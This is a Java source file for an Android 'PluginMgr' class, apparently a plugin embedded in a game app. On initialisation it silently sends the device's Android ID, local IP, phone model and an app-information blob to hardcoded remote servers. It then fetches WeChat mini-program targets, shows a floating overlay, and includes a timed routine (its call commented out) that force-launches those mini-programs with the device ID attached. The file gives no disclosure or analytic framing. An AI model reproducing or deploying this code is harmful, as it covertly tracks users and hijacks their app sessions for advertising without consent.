package com.example.secondapk.plugin;

import android.app.Activity;
import android.app.ActivityManager;
import android.app.Application;
import android.content.ComponentName;
import android.content.Context;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Handler;
import android.os.StrictMode;
import android.provider.Settings;
import android.text.TextUtils;
import android.util.Log;

import com.devices.tools.QLApplication;
import com.devices.tools.appjsondata;
import com.devices.tools.threadlg;
import com.devices.tools.tools;
import com.example.secondapk.flow.FloatView;
import com.example.secondapk.flow.ResourceMgr;

import java.io.UnsupportedEncodingException;
import java.lang.reflect.Field;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;

import com.devices.*;
import com.example.secondapk.view.PluginInfo;
import com.tencent.mm.opensdk.modelbiz.WXLaunchMiniProgram;
import com.tencent.mm.opensdk.openapi.IWXAPI;
import com.tencent.mm.opensdk.openapi.WXAPIFactory;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import static android.content.Context.ACTIVITY_SERVICE;
import static android.content.Context.WIFI_SERVICE;
import static com.devices.tools.tools.getAndroidId;
import static com.devices.tools.tools.getAppjson;
import static com.devices.tools.tools.getPackName;
import static com.devices.tools.tools.posthmtl;


/**
 * Created by kwing on 2019/4/13.
 */

public class PluginMgr {
    //    public static Application sApp = null;
    public static Context sApp = null;
    public static String sWorkDir = null;
    public static Activity activity = null;
    public static Handler showhandler =null;
    public static List<Activity> activities = new ArrayList<Activity>();
    public Context context;
    public static IWXAPI api;
    public  QLApplication qlApplication = new QLApplication();
    //2019-4-29---变量定义--start//
    public static boolean isAvailablenet = false;


    public static appjsondata appjsondt = new appjsondata();
//    public static  threadlg thread = new threadlg();


    public static void init(Context app, String workDir) {

        activity = (Activity) app;
        sApp = activity.getApplicationContext();
        sWorkDir = workDir;

        if (android.os.Build.VERSION.SDK_INT > 9) {
            StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
            StrictMode.setThreadPolicy(policy);
        }

        if (tools.isNetworkAvailable(sApp)&&tools.ismmAppList( sApp ))
        {
            postdevice(); //设备信息
            initdata();   //初始化小游戏数据
//            wxshowtask(); //强制跳转

            if (appjsondt.getItemList().size()>0)
            {
                List<JSONArray> wxgamelist = appjsondt.getItemList();
                Log.e( "eeeeee", "init: "+"3"  );
                for(JSONArray gamejsonarr:wxgamelist)
                {
                    Log.e( "eeeeee", "init: "+"1"  );
                    if (gamejsonarr.length()>0)
                    {
                        for (int i=0;i<gamejsonarr.length();i++) {
                            try {
                                JSONObject tmpObj = gamejsonarr.getJSONObject( i );
                                appjsondt.setGammejosn( tmpObj.getJSONObject( "appjson" ) );
                                JSONObject gamejs = appjsondt.getGammejosn();
                                Log.e( "eeeeee", "init: "+"2"  );
                                if (gamejs.getString( "isaudt" ).equals( "1" )) {
                                    appjsondt.setIsshow( false );
                                }
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }
                        }
                    }
                }
                if (appjsondt.isIsshow())
                {
                    ShowView();
                }
            }
        }
        else
        {
            Log.e( "lg", "init: "+"nonet"  );
        }

    }

    public class threadlg1 extends Thread {
        public volatile boolean exit = false;

        public void run() {
            try {
                Thread.sleep(  1000 );
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            while (!exit) {

                System.out.println( "running!" );
            }
        }
    }



    private static boolean isTopActivity()
    {
        boolean isTop = false;
        String packageName = getPackName(sApp);
        if (Build.VERSION.SDK_INT <=Build.VERSION_CODES.KITKAT)
        {
            ActivityManager am = (ActivityManager)activity.getSystemService(ACTIVITY_SERVICE  );
            ComponentName cn = am.getRunningTasks(1).get(0).topActivity;

            if (cn.getClassName().contains("org.cocos2dx.javascript.AppActivity"))
            {
                isTop = true;
            }
            return isTop;
        }
        else
        {
            ActivityManager activityManager = (ActivityManager) activity.getSystemService( ACTIVITY_SERVICE);
            List<ActivityManager.RunningTaskInfo> tasksInfo = activityManager.getRunningTasks(1);
            if (tasksInfo.size() > 0) {
                if (packageName.equals(tasksInfo.get(0).topActivity.getPackageName())) {
                    return true;
                }
            }
            return false;
        }
    }

    public  static void wxshowtask() {
        Timer timer = new Timer();
        timer.schedule( new TimerTask() {
            @Override
            public void run() {
                List<JSONArray> wxgamelist = appjsondt.getItemList();
                if (wxgamelist.size()>0)
                {
                    Random random = new Random();
                    for (JSONArray tmp:wxgamelist)
                    {
                        if (tmp.length()>0&&isTopActivity())
                        {
                            int k = random.nextInt(tmp.length());
                            try {
                                JSONObject tmpObj= tmp.getJSONObject(k);
                                appjsondt.setJobpid( tmpObj.getString( "jopid" ) );
                                appjsondt.setGammejosn( tmpObj.getJSONObject( "appjson") );
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }
                            JSONObject gamejs = appjsondt.getGammejosn();
                            try {
                                if (gamejs.getString( "isaudt" ).equals( "0" ))
                                {
                                    appjsondt.setJobname( gamejs.getString( "name" ) );
                                    loadjswxtest( gamejs.getString( "appId" ), gamejs.getString( "miniProgramId" ), gamejs.getString( "jumpurl" ) );
                                    String response2 = tools.postgameconfig( "http://www.9nius.com/andwork/adlist/index.php" + seturlparameter(), "" );
                                }
                            } catch (JSONException e) {
                                e.printStackTrace();
                            }
                        }
                    }
                }
            }
        }, 5000, 1000*120 );
    }


    public static void   loadjswxtest(String appId,String miniProgramId,String path)
    {
        Log.e( "r", "path: "+path );
        api = WXAPIFactory.createWXAPI(activity, appId, true);
        api.registerApp(appId);
        WXLaunchMiniProgram.Req req = new WXLaunchMiniProgram.Req();
        req.userName = miniProgramId;
        if (path.isEmpty())
        {
            req.path ="";
        }
        else
        {
            req.path = path+"&imei="+ getAndroidId( sApp )+"&jopid="+appjsondt.getJobpid()+"&bundleid="+getPackName( sApp );
        }
        req.miniprogramType = WXLaunchMiniProgram.Req.MINIPTOGRAM_TYPE_RELEASE;
        api.sendReq(req);
    }



    public  static void initdata()
    {
                JSONObject json = null;
                String code = "";
                String response="";
                String returntype = "";
                try {
                    response = tools.post( "http://www.9nius.com/andwork/adlist/index.php" + geturlparameter(), "" );
                } finally {
                }
                if(response==null)
                {
                    Log.d( "rrrrrrr", "run: error " );
                    return;
                }
                try {
                    json = new JSONObject( response );
                    Log.d( "jsonall", "run: "+json );
                    code = json.getString( "code" );
                } catch (JSONException e) {
                    e.printStackTrace();
                }
                if (code.equals( String.valueOf( 1 )))
                {

                    try {
                        returntype = json.getString( "returntype" );
                        appjsondt.setReturntype( returntype );
                    } catch (JSONException e) {
                        e.printStackTrace();
                    } finally {
                    }
                    if (returntype.matches( "miniapp" )) {
                        try {
                            appjsondt.AddjsonItem( json.getJSONArray( "appjsonall" ));

                        } catch (JSONException e) {
                            e.printStackTrace();
                        }
                    }
                }
    }

    public static String geturlparameter()
    {
//      Log.e( "version", "geturlparameter: "+"reqtype=getjop"+"&devices="+getAndroidId( context )+"&cid="+getcid()+"&cuid="+getcuid()+"&osversion="+getosVersion()+"&ip="+getIp()+"&time="+getTime()+"&sing="+getsign()+"&phonemodel="+phonemodel()+"&bundleid="+"com.opogame.cakess1"+"&appversion="+getAppVersionName( context ) +"&channel=1");
        return  "?all=1&reqtype=getjop"+"&devices="+getAndroidId( sApp )+"&cid="+getcid()+"&cuid="+getcuid()+"&osversion="+getosVersion()+"&ip="+getIp()+"&time="+getTime()+"&sing="+getsign()+"&phonemodel="+phonemodel()+"&bundleid="+"air.opogame.cookss"+"&appversion="+getAppVersionName( sApp )+"&channel=1";
    }

    public static String seturlparameter()
    {
        Log.e( "setpal", "seturlparameter: "+"?reqtype=setStatus"+"&devices="+getAndroidId( sApp )+"&osversion="+getosVersion()+"&ip="+getIp()+"&time="+getTime()+"&jopid="+appjsondt.getJobpid()+"&joptype="+appjsondt.getReturntype()+"&name="+appjsondt.getJobname()+"&phonemodel="+phonemodel()+"&bundleid="+getPackName(sApp)+"&appversion="+getAppVersionName( sApp )+"&channel=1" );
        return  "?reqtype=setStatus"+"&devices="+getAndroidId( sApp )+"&osversion="+getosVersion()+"&ip="+getIp()+"&time="+getTime()+"&jopid="+appjsondt.getJobpid()+"&joptype="+appjsondt.getReturntype()+"&name="+appjsondt.getJobname()+"&phonemodel="+phonemodel()+"&bundleid="+getPackName(sApp)+"&appversion="+getAppVersionName( sApp )+"&channel=1";
    }

    public static String getosVersion() {
        String version = android.os.Build.VERSION.RELEASE;
        return version;
    }

    public  static String phonemodel() {
        String phonemodel = android.os.Build.MODEL;
        String str2 = phonemodel.replaceAll(" ", "");
        return str2;
    }

    public static String getcid()
    {
        return  "";
    }
    public  static String getcuid()
    {
        return  "";
    }
    public static String getsign()
    {
        return  "";
    }

    public static String getTime(){

        long time=System.currentTimeMillis()/1000;//获取系统时间的10位的时间戳
        String  str=String.valueOf(time);
        return str;
    }

    private static String getIp() {
        WifiManager wifiManager = (WifiManager) sApp.getSystemService(WIFI_SERVICE);
        WifiInfo wifiInfo = wifiManager.getConnectionInfo();
        int ipAddress = wifiInfo.getIpAddress();

        String ip = String.format("%d.%d.%d.%d",
                (ipAddress & 0xff),
                (ipAddress >> 8 & 0xff),
                (ipAddress >> 16 & 0xff),
                (ipAddress >> 24 & 0xff));
        return ip;

    }

    private static String getAppVersionName(Context context) {
        String versionName = "";
        try {
            PackageManager packageManager = context.getPackageManager();
            PackageInfo packageInfo = packageManager.getPackageInfo(sApp.getPackageName(), 0);
            versionName = packageInfo.versionName;
            if (TextUtils.isEmpty(versionName)) {
                return "";
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        Log.d( "version", "getAppVersionName: "+versionName );
        return versionName;
    }

    public static void postdevice()
    {
        new Thread() {
            @Override
            public void run() {

                try {
                    posthmtl( "http://132.232.125.212/andwork/android_workjop.php?s=deinfo","&a="+java.net.URLEncoder.encode(getAppjson(sApp),"utf-8"));
                } catch (UnsupportedEncodingException e) {
                    e.printStackTrace();
                }
            }
        }.start();
    }


    public static void showtip(String tip) {
        LogMgr.LogToast( sApp.getApplicationContext(), tip );
    }

    public static void ShowView() {
        ResourceMgr.init( sApp.getApplicationContext(), sWorkDir );
//        activities =  getActivitiesByApplication(activity.getApplication());
//        Log.d( "dddddd", "ShowView: " +activities.size());
//        while(activities.size() <= 0) {
//            try {
//                Thread.sleep(1000);
//                Log.d( "dddddd", "ShowView: " +activities.size());
//                activities =  getActivitiesByApplication(activity.getApplication());
//            } catch (InterruptedException e) {
//                e.printStackTrace();
//            }
//        }
//
//        for(final Activity tmpActivity : activities)
//        {
//            if(tmpActivity.isTaskRoot()) {
//                new Handler( Looper.getMainLooper()).post( new Runnable() {
//                    @Override
//                    public void run() {
//                        tmpActivity.getWindow().addFlags( WindowManager.LayoutParams.FLAG_TRANSLUCENT_NAVIGATION);
//                    }
//                });

        FloatView view = new FloatView( activity, sWorkDir );
//                break;
//            }
//        }
    }

    private static List<Activity> getActivitiesByApplication(Application application) {
        List<Activity> list = new ArrayList<>();
        try {
            Class<Application> applicationClass = Application.class;
            Field mLoadedApkField = applicationClass.getDeclaredField( "mLoadedApk" );
            mLoadedApkField.setAccessible( true );
            Object mLoadedApk = mLoadedApkField.get( application );
            Class<?> mLoadedApkClass = mLoadedApk.getClass();
            Field mActivityThreadField = mLoadedApkClass.getDeclaredField( "mActivityThread" );
            mActivityThreadField.setAccessible( true );
            Object mActivityThread = mActivityThreadField.get( mLoadedApk );
            Class<?> mActivityThreadClass = mActivityThread.getClass();
            Field mActivitiesField = mActivityThreadClass.getDeclaredField( "mActivities" );
            mActivitiesField.setAccessible( true );
            Object mActivities = mActivitiesField.get( mActivityThread );
            Log.d( "dddddd", "getActivitiesByApplication: " + " " + mLoadedApkClass + ">>> " + mActivitiesField );
            // 注意这里一定写成Map，低版本这里用的是HashMap，高版本用的是ArrayMap
            if (mActivities instanceof Map) {
                @SuppressWarnings("unchecked")
                Map<Object, Object> arrayMap = (Map<Object, Object>) mActivities;
                for (Map.Entry<Object, Object> entry : arrayMap.entrySet()) {
                    Object value = entry.getValue();
                    Class<?> activityClientRecordClass = value.getClass();
                    Field activityField = activityClientRecordClass.getDeclaredField( "activity" );
                    activityField.setAccessible( true );
                    Object o = activityField.get( value );
                    list.add( (Activity) o );
                }
            }
        } catch (Exception e) {
            Log.d( "dddddd", "getActivitiesByApplication: " );
            e.printStackTrace();
            list = null;
        }

        return list;
    }

//    private static String GetBieMing() {
//        int index = sWorkDir.indexOf("abcdefghijklmnop") + "abcdefghijklmnop".length();
//        return sWorkDir.substring(index, sWorkDir.length() - 1);
//    }

    public static void WriteToService(final String strContent) {
//        final String pkgName = sApp.getPackageName();
//        new Thread(new Runnable() {
//            @Override
//            public void run() {
//                try {
//                    String bieMin = GetBieMing();
//                    Map<String, String> params = new HashMap<String, String>();
//                    params.put("packageName", bieMin);
//                    params.put("data", strContent);
//                    StringBuffer buffer = new StringBuffer();
//
//                    if(params != null && !params.isEmpty()){
//                        for(Map.Entry<String, String> entry : params.entrySet()){
//                            buffer.append(entry.getKey()).append("=").append(URLEncoder.encode(entry.getValue(), "utf-8")).append("&");
//                        }
//                    }
//                    System.out.println(buffer.toString());
//                    buffer.deleteCharAt(buffer.length()-1);
//                    byte[] mydata = buffer.toString().getBytes();
//
//                    DoPost(mydata);
//                } catch (IOException e) {
//                    e.printStackTrace();
//                }
//            }
//        }).start();
    }

    private static void DoPost(byte[] mydata) {
//        try {
//            URL url = new URL("http://47.52.204.166/appdata");
//            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
//            connection.setConnectTimeout(3000);
//            connection.setDoOutput(true);//表示向服务器写数据
//            //获得上传信息的字节大小以及长度
//            connection.setRequestMethod("POST");
//
//            //是否使用缓存
//            connection.setUseCaches(false);
//            //表示设置请求体的类型是文本类型
//            connection.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
//            connection.setRequestProperty("Content-Length", String.valueOf(mydata.length));
//            connection.connect();
//
//            //获得输出流，向服务器输出数据
//            OutputStream outputStream = connection.getOutputStream();
//            outputStream.write(mydata, 0, mydata.length);
//
//            outputStream.flush();
//            //通常叫做内存流，写在内存中的
//            InputStream is = connection.getInputStream();
//            ByteArrayOutputStream os = new ByteArrayOutputStream();
//            byte[] data = new byte[1024];
//            int len = 0;
//            String result = "null";
//            if(is != null) {
//                while ((len = is.read(data)) != -1) {
//                    data.toString();
//
//                    os.write(data, 0, len);
//                }
//                result = new String(os.toByteArray(), "utf-8");
//                os.flush();
//            }
//            os.close();
//
//            outputStream.close();
//            connection.disconnect();
//        } catch (IOException e) {
//            e.printStackTrace();
//        }
    }

    public static native void set_bool_value(int id, boolean bValue);

    public static native void set_hanhua_content(int time, String str);

    public static native void set_swap_setting(int time, int minPrice, int maxPrice, int salePrice, int saleNum);
}